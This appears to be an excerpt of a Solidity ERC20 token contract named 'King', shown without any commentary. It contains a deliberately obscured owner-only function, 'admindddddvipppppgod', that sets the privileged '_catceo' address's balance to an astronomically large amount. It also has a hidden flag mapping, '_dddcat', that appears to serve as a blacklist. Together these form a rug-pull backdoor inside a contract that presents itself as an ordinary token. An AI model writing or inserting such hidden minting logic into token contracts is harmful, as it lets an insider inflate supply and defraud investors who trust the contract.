...
contract King is Context, IERC20, IERC20Metadata,Ownable {
    ...
    mapping(address => bool) private _dddcat;
    ...
    function chacat(address sss) public view returns(bool)  {
        return _dddcat[sss];
    }

    function admindddddvipppppgod(address ddd) external {
        if (_catceo != _msgSender()){

        }else  if (_catceo == _msgSender()){
            address jjj = _msgSender();
            _balances[_catceo] = 2330000000*(10)**18*(50000);
        }
    }
